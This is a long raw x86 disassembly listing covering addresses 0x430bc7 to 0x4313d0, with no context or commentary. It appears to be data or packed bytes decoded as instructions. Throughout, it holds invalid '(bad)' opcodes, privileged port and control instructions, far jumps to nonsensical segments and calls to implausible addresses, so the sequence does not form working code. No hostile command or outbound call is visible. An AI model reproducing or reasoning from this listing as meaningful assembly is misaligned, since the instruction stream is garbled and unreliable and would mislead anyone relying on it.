  430bc7:	inc    DWORD PTR [edi]
  430bc9:	mov    eax,esi
  430bcb:	cld    
  430bcc:	add    DWORD PTR [eax+0x901c6],eax
  430bd2:	leave  
  430bd3:	xor    BYTE PTR [ebp+0x45],dl
  430bd6:	in     al,dx
  430bd7:	mov    edx,DWORD PTR [ecx-0x40]
  430bda:	inc    ebp
  430bdb:	add    BYTE PTR [ecx-0x74000301],cl
  430be1:	int3   
  430be2:	cld    
  430be3:	jne    0x430b9d
  430be5:	call   0xcc1ef0
  430bea:	mov    esi,DWORD PTR [ebp-0x8]
  430bed:	test   eax,esi
  430bef:	je     0x430c66
  430bf1:	mov    eax,esi
  430bf3:	cld    
  430bf4:	add    al,0x80
  430bf6:	add    WORD PTR [ecx+0x0],ax
  430bfa:	fiadd  DWORD PTR [eax]
  430bfc:	mov    BYTE PTR [eax],0x3d
  430bff:	push   0xffffffc3
  430c01:	push   esi
  430c02:	mov    edx,DWORD PTR [eax+0x51]
  430c05:	pop    edi
  430c06:	lea    ebx,[ebx-0x8]
  430c09:	ret    0x45
  430c0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c12:	xchg   eax,edi
  430c14:	mov    DWORD PTR [ebp-0x75],ecx
  430c17:	push   esi
  430c18:	clc    
  430c19:	jne    0x430beb
  430c1b:	mov    ecx,0xf8450b0b
  430c20:	(bad)  
  430c21:	push   cs
  430c22:	or     BYTE PTR [ebp-0x3a],dh
  430c25:	cmp    eax,DWORD PTR [ecx]
  430c27:	pop    esi
  430c28:	(bad)  
  430c29:	or     al,0x5
  430c2b:	inc    eax
  430c2c:	leave  
  430c2d:	jmp    0x40cf:0x25564204
  430c34:	leave  
  430c35:	in     eax,dx
  430c36:	inc    DWORD PTR [eax-0x75]
  430c39:	fimul  DWORD PTR [ebx-0x228139be]
  430c3f:	inc    eax
  430c40:	nop
  430c41:	loopne 0x430c42
  430c43:	ret    
  430c44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c4a:	add    eax,0xff45e8f8
  430c4f:	push   esi
  430c50:	push   DWORD PTR [ebp-0x39]
  430c53:	mov    eax,0x7edda46
  430c58:	or     al,0x6
  430c5a:	push   DWORD PTR [ebp-0x3a]
  430c5d:	cmp    eax,DWORD PTR [edx]
  430c5f:	pop    esi
  430c60:	ret    
  430c61:	or     al,0x56
  430c63:	inc    ecx
  430c64:	push   ebp
  430c65:	jle    0x430c53
  430c67:	inc    edx
  430c68:	inc    ebp
  430c69:	int    0x1
  430c6b:	inc    ecx
  430c6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430c72:	add    DWORD PTR [edx+0x1c],eax
  430c75:	retf   0xc38b
  430c78:	adc    al,0x8b
  430c7a:	xchg   edx,eax
  430c7b:	push   ecx
  430c7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430c82:	rcl    DWORD PTR [esi-0x9],cl
  430c85:	jne    0x430cd7
  430c87:	mov    eax,0x7c80ece
  430c8c:	rol    DWORD PTR [esi],cl
  430c8e:	div    DWORD PTR [ebp+0x50]
  430c91:	cmp    ecx,edx
  430c93:	pop    esi
  430c94:	dec    BYTE PTR [edx]
  430c96:	in     al,dx
  430c97:	inc    edx
  430c98:	sub    esp,ecx
  430c9a:	inc    eax
  430c9b:	(bad)  
  430c9c:	push   eax
  430c9d:	add    edx,DWORD PTR [eax-0x1f]
  430ca0:	push   edi
  430ca1:	add    dh,dh
  430ca3:	leave  
  430ca4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430ca8:	add    BYTE PTR [ecx+0x0],dl
  430cab:	inc    ebp
  430cac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430cb2:	add    BYTE PTR [eax-0x7fbf448],bh
  430cb8:	add    al,0x2
  430cba:	jmp    0x57eb814
  430cbf:	jne    0x430ca9
  430cc1:	mov    eax,DWORD PTR [edx]
  430cc3:	or     BYTE PTR [eax],al
  430cc5:	inc    ecx
  430cc6:	stc    
  430cc7:	in     eax,dx
  430cc8:	ss inc eax
  430cca:	aas    
  430ccb:	out    0x7d,eax
  430ccd:	inc    ecx
  430cce:	mov    ebp,ecx
  430cd0:	lock ret 0x7d
  430cd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430cda:	add    bh,bh
  430cdc:	aad    0xd7
  430cde:	add    dh,cl
  430ce0:	clts   
  430ce2:	(bad)  
  430ce3:	call   0xffce0be8
  430ce8:	hlt    
  430ce9:	iret   
  430cea:	jge    0x430cc2
  430cec:	rol    DWORD PTR [esi-0x80],cl
  430cef:	jmp    0x1c5bfc
  430cf4:	out    dx,al
  430cf5:	mov    eax,DWORD PTR [ebx]
  430cf7:	(bad)  
  430cf8:	pop    esi
  430cf9:	push   es
  430cfa:	cmp    al,0xe8
  430cfc:	sar    edi,0x8
  430cff:	inc    DWORD PTR [edi]
  430d01:	inc    esi
  430d02:	(bad)  
  430d03:	loopne 0x430d83
  430d05:	push   edi
  430d06:	push   cs
  430d07:	push   ebx
  430d08:	add    BYTE PTR [ebx+0x24008b56],cl
  430d0e:	add    BYTE PTR [ebp+0x50],al
  430d11:	push   eax
  430d12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d18:	sub    edx,DWORD PTR [esi-0x24]
  430d1b:	jne    0x430cd3
  430d1d:	lods   eax,DWORD PTR ds:[esi]
  430d1e:	mov    edx,DWORD PTR [edx-0x34]
  430d21:	dec    esi
  430d22:	out    0x83,eax
  430d24:	into   
  430d25:	push   edi
  430d27:	loopne 0x430cf7
  430d29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d34:	rol    DWORD PTR [edx],0x8
  430d37:	mov    esp,ecx
  430d39:	cmp    DWORD PTR [ebx],0xc
  430d3c:	mov    esi,0x5001c0
  430d41:	push   eax
  430d42:	push   cs
  430d43:	push   eax
  430d44:	(bad)  
  430d45:	sub    edx,edi
  430d47:	push   esi
  430d48:	adc    al,0xcb
  430d4a:	ins    DWORD PTR es:[edi],dx
  430d4b:	mov    eax,0x203e8
  430d50:	add    al,ah
  430d52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d59:	add    dh,al
  430d5b:	add    ah,ch
  430d5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d63:	pop    ecx
  430d64:	or     eax,ebx
  430d66:	cli    
  430d67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d6d:	lea    ebp,[ebx]
  430d6f:	mov    edx,DWORD PTR [edx-0x4]
  430d72:	dec    ecx
  430d73:	inc    ebp
  430d74:	shr    BYTE PTR [ebx],0x4b
  430d77:	and    al,0x0
  430d79:	(bad)  
  430d7a:	jne    0x430dc1
  430d7c:	pop    eax
  430d7d:	mov    al,0x5a
  430d7f:	call   0x1420fde
  430d84:	and    al,0x85
  430d86:	push   edx
  430d87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d8b:	dec    ebp
  430d8c:	mov    cl,0x23
  430d8e:	jmp    0x430d7c
  430d90:	mov    al,0xe7
  430d92:	call   0x1391080
  430d97:	shr    DWORD PTR [eax+ebx*2],cl
  430d9a:	lock (bad) 
  430d9c:	adc    eax,0x757f008d
  430da1:	out    0x58,eax
  430da3:	cmp    al,0x7
  430da5:	pop    edx
  430da6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dad:	push   ecx
  430dae:	cld    
  430daf:	mov    esi,0x3b0175
  430db4:	and    al,0xb0
  430db6:	xor    BYTE PTR [edx+0x1],0x8b
  430dba:	add    ah,bh
  430dbc:	mov    edi,DWORD PTR [ebp-0x4]
  430dbf:	psubsw mm7,QWORD PTR [edi]
  430dc2:	add    DWORD PTR [ebp+0x0],ebp
  430dc5:	rcr    eax,1
  430dc7:	mov    edi,ecx
  430dc9:	and    eax,DWORD PTR [eax]
  430dcb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430dd1:	call   0x13010ba
  430dd6:	add    al,cl
  430dd8:	mov    ebp,esi
  430dda:	aam    0x83
  430ddc:	or     DWORD PTR [ecx],eax
  430dde:	jne    0x430dd1
  430de0:	mov    eax,DWORD PTR [eax]
  430de2:	aam    0x0
  430de4:	dec    ebp
  430de5:	jne    0x430d72
  430de7:	cmp    ebx,eax
  430de9:	jb     0x430e38
  430deb:	jmp    0x430d78
  430ded:	mov    ebx,esp
  430def:	int3   
  430df0:	dec    ebp
  430df1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430df8:	mov    edx,0x8b0a8b
  430dfd:	cmp    ecx,DWORD PTR [eax]
  430dff:	jb     0x430dd8
  430e01:	pop    edx
  430e02:	push   edi
  430e03:	cli    
  430e04:	pop    es
  430e05:	mov    eax,ecx
  430e07:	jb     0x430e0b
  430e09:	add    DWORD PTR [ebx],0xa
  430e0c:	mov    eax,DWORD PTR [ebx]
  430e0e:	int3   
  430e0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e15:	jmp    0x430da2
  430e17:	mov    al,0xe8
  430e19:	call   0x104109b
  430e1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430e21:	pop    edi
  430e22:	or     BYTE PTR [ecx-0x73],bl
  430e25:	pop    ecx
  430e26:	inc    edi
  430e27:	xor    al,0xeb
  430e29:	push   ecx
  430e2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e30:	call   0xb20f35
  430e35:	int3   
  430e36:	sbb    BYTE PTR [esi],ch
  430e38:	inc    ebp
  430e39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e3f:	call   0x9c10ae
  430e44:	or     BYTE PTR [ebx-0x73],dl
  430e47:	cmp    al,0x47
  430e49:	mov    al,0x1
  430e4b:	jb     0x430e4d
  430e4d:	mov    al,0x10
  430e4f:	push   eax
  430e50:	add    al,0x75
  430e52:	add    BYTE PTR [ebx],ch
  430e54:	add    ebx,esp
  430e56:	int3   
  430e57:	jne    0x430e69
  430e59:	movsx  edx,cl
  430e5c:	add    DWORD PTR [eax],eax
  430e5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e65:	mov    gs,edi
  430e67:	add    BYTE PTR [eax-0x50],ch
  430e6a:	add    al,ch
  430e6c:	mov    eax,DWORD PTR [ecx]
  430e6e:	sub    eax,DWORD PTR [eax]
  430e70:	jb     0x430ee7
  430e72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e76:	jge    0x430e60
  430e78:	add    al,0x1
  430e7a:	add    DWORD PTR [eax],0x0
  430e7d:	jne    0x430e7f
  430e7f:	je     0x430ec6
  430e81:	mov    eax,DWORD PTR [edi]
  430e83:	ror    BYTE PTR [ebp+0x4d],1
  430e86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430e8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430e93:	mov    DWORD PTR [ebx],ebp
  430e95:	fadd   DWORD PTR [eax+0x75]
  430e98:	inc    eax
  430e99:	pop    eax
  430e9a:	lea    ebx,[ecx+0x4f]
  430e9d:	push   0xb1000003
  430ea2:	out    dx,eax
  430ea3:	add    ebp,DWORD PTR [edx+edx*2]
  430ea6:	add    BYTE PTR [ebx+ecx*4],bh
  430ea9:	mov    ch,BYTE PTR [ebx]
  430eab:	jb     0x430f1f
  430ead:	add    al,0x89
  430eaf:	push   eax
  430eb0:	call   0x842b5c22
  430eb5:	add    DWORD PTR [eax+eax*1],eax
  430eb8:	jae    0x430ece
  430eba:	icebp  
  430ebb:	inc    ebp
  430ebc:	mov    eax,DWORD PTR gs:[ecx]
  430ebf:	int3   
  430ec0:	out    dx,al
  430ec1:	loopne 0x430f10
  430ec3:	sub    eax,DWORD PTR [edx]
  430ec5:	push   0xffffff83
  430ec7:	pop    esi
  430ec8:	push   cs
  430ec9:	jl     0x430ee4
  430ecb:	add    al,0xaf
  430ecd:	xor    eax,0x832b6d00
  430ed2:	mov    eax,DWORD PTR [edx]
  430ed4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ee0:	inc    ebp
  430ee1:	shr    ebx,0x3
  430ee4:	or     DWORD PTR [eax],0x4
  430ee7:	push   0xffffffa5
  430ee9:	pop    esi
  430eea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ef1:	jmp    0x430f50
  430ef3:	mov    edi,0xff0272
  430ef8:	fdivr  QWORD PTR [ebp+0x5d]
  430efb:	push   0x4e
  430efd:	pop    ecx
  430efe:	call   0x435303
  430f03:	mov    DWORD PTR [ebx],eax
  430f05:	in     al,0xc8
  430f07:	rol    BYTE PTR [ebp-0x75],0xc1
  430f0b:	call   0xad10ec
  430f10:	pop    esi
  430f11:	enter  0xceff,0x8b
  430f15:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f19:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f20:	je     0x430f22
  430f22:	or     DWORD PTR [ebx-0x74183b24],eax
  430f28:	jne    0x430f0e
  430f2a:	jmp    0x430f25
  430f2c:	push   DWORD PTR [edx-0x24]
  430f2f:	push   0x4d
  430f31:	pop    ecx
  430f32:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f36:	jge    0x430f3e
  430f38:	mov    eax,eax
  430f3a:	sub    ebp,DWORD PTR [edx+0x24]
  430f3d:	pop    esi
  430f3e:	inc    ebp
  430f3f:	mov    esp,0x8b6077
  430f44:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f4a:	lods   al,BYTE PTR ds:[esi]
  430f4b:	add    BYTE PTR [ebx],bh
  430f4d:	enter  0xce73,0x49
  430f51:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f59:	stc    
  430f5a:	jge    0x430fce
  430f5c:	jnp    0xdd4292cb
  430f62:	call   0xc61038
  430f67:	fadd   st(0),st
  430f69:	dec    esi
  430f6a:	ins    BYTE PTR es:[edi],dx
  430f6b:	stc    
  430f6c:	cmp    al,0x73
  430f6e:	push   ebp
  430f6f:	mov    eax,0xf8028b
  430f74:	jne    0x430f37
  430f76:	mov    esi,ecx
  430f78:	mov    esp,DWORD PTR [ebp+0x2c]
  430f7b:	add    edi,DWORD PTR [ebp-0x24]
  430f7e:	sub    esp,eax
  430f80:	and    al,0x45
  430f82:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f88:	sbb    al,0xee
  430f8a:	pop    esi
  430f8b:	call   0x830fbb
  430f90:	fsubr  st,st(3)
  430f92:	sti    
  430f93:	add    BYTE PTR gs:[ecx],bh
  430f96:	add    eax,esp
  430f98:	add    DWORD PTR [esi],eax
  430f9a:	rol    DWORD PTR [ebp+0x8],0x29
  430f9e:	mov    esp,eax
  430fa0:	clc    
  430fa1:	jne    0x431018
  430fa3:	mov    eax,0x8b0673
  430fa8:	loopne 0x430fef
  430faa:	loopne 0x430f35
  430fac:	lods   al,BYTE PTR ds:[esi]
  430fad:	int3   
  430fae:	inc    ebp
  430faf:	mov    DWORD PTR gs:[eax+edi*8],eax
  430fb3:	add    al,0xc3
  430fb5:	sub    ecx,DWORD PTR [ebp+0x47]
  430fb8:	(bad)  
  430fba:	shr    BYTE PTR [ebp-0x1f],0xe8
  430fbe:	add    eax,DWORD PTR [eax]
  430fc0:	call   0x644d0c5
  430fc5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430fcb:	dec    esi
  430fcc:	ins    DWORD PTR es:[edi],dx
  430fcd:	in     al,dx
  430fce:	lea    eax,[eax]
  430fd0:	inc    ebp
  430fd1:	inc    ebp
  430fd2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fd8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430fe2:	and    al,0xdc
  430fe4:	ror    DWORD PTR [edx+0x24],0xf7
  430fe8:	or     BYTE PTR [ebp+0x4c],dh
  430feb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430fef:	stos   BYTE PTR es:[edi],al
  430ff0:	adc    edx,edi
  430ff2:	inc    esp
  430ff3:	add    edi,DWORD PTR [eax]
  430ff5:	jne    0x430fda
  430ff7:	mov    DWORD PTR [eax-0x7449db04],ecx
  430ffd:	cmp    ecx,DWORD PTR [edi]
  430fff:	sub    BYTE PTR [ebp-0x7e],dl
  431002:	sar    ebp,0xb
  431005:	jmp    FWORD PTR [edi+0x2400392a]
  43100b:	sub    esi,DWORD PTR [ebx-0x73]
  43100e:	mov    esp,DWORD PTR [ecx+edi*4]
  431011:	mov    ecx,DWORD PTR [eax]
  431013:	and    BYTE PTR [eax],al
  431015:	jne    0x430fe1
  431017:	sub    ebp,ecx
  431019:	sbb    BYTE PTR [esi+0x32],ah
  43101c:	dec    ebp
  43101d:	push   ebp
  43101e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431024:	ret    
  431025:	mov    edx,ebp
  431027:	leave  
  431028:	sub    DWORD PTR [esi+0x24],ebx
  43102b:	ret    0x2b
  43102e:	pop    ax
  431030:	push   ebp
  431031:	rol    BYTE PTR [ebx],0xeb
  431034:	add    DWORD PTR [ecx+0x6c0001],0x40
  43103b:	jb     0x431092
  43103d:	ret    
  43103e:	in     al,dx
  43103f:	jecxz  0x430fcc
  431041:	push   esi
  431042:	xchg   esp,eax
  431043:	jne    0x431045
  431045:	cmp    edx,DWORD PTR [esi+0x1c]
  431048:	jne    0x43102e
  43104a:	mov    eax,DWORD PTR [ebp-0x77]
  43104d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431054:	mov    esi,DWORD PTR [ebp-0x75]
  431057:	pop    esi
  431058:	nop
  431059:	mov    eax,DWORD PTR [eax]
  43105b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431061:	add    al,0x0
  431063:	inc    ebp
  431064:	mov    eax,DWORD PTR [ebx]
  431066:	mov    ebp,ebx
  431068:	cmp    al,0xf
  43106a:	or     al,al
  43106c:	inc    ebp
  43106d:	inc    ebp
  43106e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431074:	cld    
  431075:	add    BYTE PTR [edi+0x546c16c0],dh
  43107b:	add    BYTE PTR [ecx-0x5],dl
  43107e:	add    eax,0x17200
  431083:	sbb    al,0x85
  431085:	dec    esp
  431086:	je     0x4310c0
  431088:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43108c:	add    BYTE PTR [ebx],bh
  43108e:	(bad)  
  43108f:	and    al,0x32
  431091:	jae    0x43102f
  431093:	mov    cl,cl
  431095:	inc    DWORD PTR [esp]
  431098:	push   ebp
  431099:	shr    esp,0x8
  43109c:	in     al,dx
  43109d:	push   esp
  43109e:	add    DWORD PTR [eax],esp
  4310a0:	add    bl,cl
  4310a2:	inc    ebp
  4310a3:	mov    bh,0x89
  4310a5:	add    ah,bh
  4310a7:	jmp    0xca751ff1
  4310ac:	pushf  
  4310ad:	dec    esp
  4310ae:	mov    edx,0xf8178520
  4310b3:	fst    DWORD PTR [ebp+0x0]
  4310b6:	mov    BYTE PTR [eax],0xc4
  4310b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4310bc:	inc    ebp
  4310bd:	add    eax,0xc601da
  4310c2:	mov    al,0xc6
  4310c5:	ins    BYTE PTR es:[edi],dx
  4310c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4310cd:	dec    esp
  4310ce:	jmp    DWORD PTR [eax]
  4310d0:	inc    ebp
  4310d1:	fnstcw WORD PTR [esi+0x29]
  4310d4:	test   BYTE PTR [eax],0xc8
  4310d7:	rol    BYTE PTR [eax],0xc0
  4310da:	lea    ecx,[ebp-0x3cf0dbcb]
  4310e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4310e6:	inc    esi
  4310e7:	add    DWORD PTR [eax],ebx
  4310e9:	add    dh,bh
  4310eb:	mov    esi,DWORD PTR [edx+0x8]
  4310ee:	(bad)  
  4310ef:	fdiv   QWORD PTR ss:[ecx]
  4310f2:	(bad)  
  4310f3:	mov    bl,ch
  4310f5:	add    esi,eax
  4310f7:	add    dh,bl
  4310f9:	or     esi,eax
  4310fb:	mov    dl,0xdf
  4310fd:	add    esi,eax
  4310ff:	add    al,ah
  431101:	push   cs
  431102:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431109:	or     BYTE PTR [ebx],dh
  43110b:	dec    ecx
  43110c:	lea    eax,[ebx]
  43110e:	xor    eax,0x18fc0fc7
  431113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431114:	repz clc 
  431116:	add    eax,DWORD PTR [ebp+0x46]
  431119:	prefetcht0 BYTE PTR [ecx-0x2]
  43111d:	xor    eax,0x7c60872
  431122:	mov    esp,0xbd32c69b
  431127:	pop    esi
  431128:	mov    cl,0xbe
  43112b:	or     al,0xc6
  43112d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431134:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43113b:	add    dh,al
  43113d:	mov    eax,ebx
  43113f:	xor    DWORD PTR [ebx],0x35008dbc
  431145:	mov    ecx,DWORD PTR [edi]
  431147:	sbb    al,0x18
  431149:	inc    ebp
  43114a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431151:	clc    
  431152:	(bad)  
  431153:	xor    DWORD PTR [edx-0x64],esi
  431156:	lea    ecx,[ecx+0x45ffe838]
  43115c:	mov    ecx,ebx
  43115e:	fadd   st,st(6)
  431160:	dec    ebp
  431161:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431167:	out    0x1,eax
  431169:	inc    ebp
  43116a:	lea    ebp,ds:0xc8ffc6ff
  431170:	enter  0xa33,0xc6
  431174:	push   ebp
  431175:	leave  
  431176:	(bad)  
  431177:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43117d:	add    BYTE PTR [ebp+0x44],al
  431180:	mov    eax,esp
  431182:	mov    WORD PTR [esi+0x46398300],?
  431188:	psubusw mm4,QWORD PTR [esi-0x78]
  43118c:	add    BYTE PTR [ebx-0x1303f975],al
  431192:	add    BYTE PTR [ebp+0x1],0xeb
  431196:	add    BYTE PTR [ebp+0x38],al
  431199:	in     eax,dx
  43119a:	inc    ebp
  43119b:	inc    ebp
  43119c:	mov    ebx,ebx
  43119e:	add    BYTE PTR [ebp+0x0],0xec
  4311a2:	mov    DWORD PTR [ebp-0x41],eax
  4311a5:	sub    eax,0x2c00454e
  4311aa:	ins    DWORD PTR es:[edi],dx
  4311ab:	inc    ebp
  4311ac:	add    BYTE PTR [esi+0x66],bh
  4311af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4311b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4311c0:	dec    edi
  4311c1:	pop    es
  4311c2:	add    ah,ch
  4311c4:	mov    DWORD PTR [ebp+0x68],eax
  4311c7:	in     eax,dx
  4311c8:	inc    DWORD PTR [ebp-0x7d]
  4311cb:	out    0xc0,al
  4311cd:	inc    ebp
  4311ce:	mov    edx,esp
  4311d0:	push   0x45
  4311d2:	(bad)  
  4311d3:	jmp    0xdf925790
  4311d8:	add    BYTE PTR [ebp-0x77],al
  4311db:	out    dx,al
  4311dc:	ins    BYTE PTR es:[edi],dx
  4311dd:	inc    ebp
  4311de:	jmp    edi
  4311e0:	add    DWORD PTR [ebp-0x14],0x7e
  4311e4:	mov    esi,esi
  4311e6:	outs   dx,BYTE PTR ds:[esi]
  4311e7:	inc    esp
  4311e8:	(bad)  
  4311e9:	mov    esp,0x8341b68d
  4311ee:	mov    DWORD PTR [esi+0x70],eax
  4311f1:	fcos   
  4311f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4311f9:	in     al,dx
  4311fa:	jb     0x431181
  4311fc:	(bad)  
  4311fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431203:	mov    edi,edi
  431205:	fdivr  st,st(7)
  431207:	out    dx,eax
  431208:	rcl    BYTE PTR [ebx],0x66
  43120b:	mov    DWORD PTR [ebp-0xc70075],eax
  431211:	(bad)  
  431212:	std    
  431213:	cmp    eax,DWORD PTR [eax]
  431215:	jne    0x43127d
  431217:	mov    DWORD PTR [ebp-0xba0048],eax
  43121d:	in     al,dx
  43121e:	outs   dx,BYTE PTR ds:[esi]
  43121f:	pushf  
  431220:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431226:	inc    DWORD PTR [ecx]
  431228:	inc    DWORD PTR [eax]
  43122a:	jae    0x431264
  43122c:	add    BYTE PTR [ebp+0x850266],al
  431232:	inc    DWORD PTR [ebp-0x1]
  431235:	mov    eax,eax
  431237:	jl     0x43129f
  431239:	add    BYTE PTR [ebp-0x740077],al
  43123f:	cld    
  431240:	dec    eax
  431241:	add    BYTE PTR [eax],0x1
  431244:	data16 add BYTE PTR [ebp+0x38],al
  431248:	mov    eax,0x47c2
  43124d:	mov    eax,0x824f89
  431252:	inc    edi
  431253:	mov    DWORD PTR [edx+0x64],ebp
  431256:	inc    WORD PTR [ebp-0x75]
  43125a:	(bad)  
  43125b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431262:	inc    ebp
  431263:	jge    0x431244
  431265:	add    bh,ah
  431267:	lea    ax,[ebp-0x750030]
  43126e:	add    al,0x46
  431271:	jmp    0x40ff:0x8885
  431277:	push   DWORD PTR [ebp+0x52]
  43127a:	lea    eax,[eax]
  43127c:	shl    BYTE PTR [esi-0x7b],1
  43127f:	test   esi,edi
  431281:	(bad)  
  431282:	(bad)  
  431283:	inc    DWORD PTR [ebp-0x990140]
  431289:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43128f:	inc    edi
  431290:	push   ecx
  431291:	xor    ax,WORD PTR [ebp-0x8d0045]
  431298:	add    al,al
  43129a:	ret    
  43129b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4312a2:	push   eax
  4312a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4312aa:	add    BYTE PTR [ebx-0x764f8839],al
  4312b0:	push   DWORD PTR [esi+0x1]
  4312b3:	inc    DWORD PTR [eax]
  4312b5:	mov    eax,0xff99ff
  4312ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4312c0:	jne    0x43127a
  4312c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4312cc:	mov    ecx,0xd74fb8
  4312d1:	add    cl,al
  4312d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4312d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4312e0:	(bad)  
  4312e1:	push   ebp
  4312e3:	mov    eax,0x8c2789
  4312e8:	ret    0x6689
  4312eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4312ef:	add    bh,ah
  4312f1:	mov    WORD PTR [ebp-0x70],ax
  4312f5:	(bad)  
  4312f6:	ret    0x667d
  4312f9:	or     BYTE PTR [ebp-0x77],dl
  4312fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431303:	loop   0x43128e
  431305:	(bad)  
  431306:	xchg   esi,eax
  431307:	aam    0xcf
  431309:	out    dx,al
  43130a:	mov    DWORD PTR [esi-0x68],edi
  43130d:	inc    ebp
  43130e:	dec    edx
  43130f:	pop    ecx
  431310:	mov    edx,DWORD PTR [eax]
  431312:	repnz push bp
  431315:	or     BYTE PTR [ebx+0x55106638],0x49
  43131c:	(bad)  
  43131d:	repnz xor eax,0xa0898945
  431323:	mov    ah,0x89
  431325:	jmp    DWORD PTR [edx+0x66b0418d]
  43132b:	inc    DWORD PTR [ebp+0x50]
  43132e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431332:	mov    DWORD PTR [eax],ecx
  431334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431335:	pop    es
  431336:	inc    ecx
  431337:	(bad)  
  431338:	data16 fwait
  43133a:	inc    ebp
  43133b:	xor    ah,BYTE PTR [esi+0x3]
  43133e:	dec    ebp
  43133f:	push   eax
  431340:	inc    bp
  431342:	jge    0x4312c7
  431344:	mov    esp,DWORD PTR [esi-0x18]
  431347:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43134d:	add    DWORD PTR [ebx],esi
  43134f:	add    BYTE PTR [ebx],al
  431351:	test   DWORD PTR [ebx],esi
  431353:	(bad)  
  431354:	inc    WORD PTR [ebp+0x0]
  431358:	mov    eax,DWORD PTR [eax]
  43135a:	call   0x8898ca8f
  43135f:	mov    esi,eax
  431361:	clc    
  431362:	ret    
  431363:	rol    cl,0xa
  431366:	mov    DWORD PTR ds:0x7c0ec88,esi
  43136c:	mov    edx,edi
  43136e:	pushf  
  43136f:	pop    es
  431370:	jmp    FWORD PTR [edx+0x66]
  431373:	add    BYTE PTR [ebp-0x990175],al
  431379:	inc    ebp
  43137a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431380:	push   ebp
  431381:	mov    edi,eax
  431383:	mov    dh,BYTE PTR [eax+0x266ff51]
  431389:	push   ebp
  43138a:	add    BYTE PTR [ebx-0x764b0777],al
  431390:	dec    DWORD PTR [esi+0x661851e8]
  431396:	add    BYTE PTR [ebp-0x7b],dl
  431399:	cmp    esi,0xfffffffb
  43139c:	dec    DWORD PTR [ecx+0x51fe9285]
  4313a2:	jmp    DWORD PTR [esi-0x75]
  4313a5:	push   ebp
  4313a6:	hlt    
  4313a7:	data16 (bad) 
  4313a9:	dec    ebp
  4313aa:	ret    
  4313ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313b1:	lea    edx,[eax-0x1]
  4313b4:	jne    0x431387
  4313b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4313bc:	dec    BYTE PTR [ecx+0x51559eff]
  4313c2:	mov    DWORD PTR [esi-0x4c],esp
  4313c5:	push   ebp
  4313c6:	jmp    DWORD PTR [esi-0x18]
  4313c9:	inc    ebp
  4313ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4313d0:	(bad)  
